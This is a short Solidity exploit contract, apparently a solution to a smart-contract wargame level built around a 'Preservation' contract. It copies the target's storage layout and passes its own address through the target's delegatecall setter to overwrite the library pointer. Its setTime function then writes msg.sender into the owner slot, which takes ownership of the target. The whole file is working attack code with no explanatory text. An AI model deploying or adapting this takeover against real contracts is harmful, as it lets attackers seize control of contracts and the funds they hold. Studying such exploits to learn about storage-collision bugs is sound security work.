pragma solidity ^0.6.0;


interface Preservation {
    function setFirstTime(uint) external;
}

contract Mean {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  Preservation victim;


  constructor(address _addr) public {
    victim = Preservation(_addr);
  }

  function setStorage0() public {
    victim.setFirstTime(uint(address(this)));
  }

  function setTime(uint _time) public {
    owner = msg.sender;
  }
}

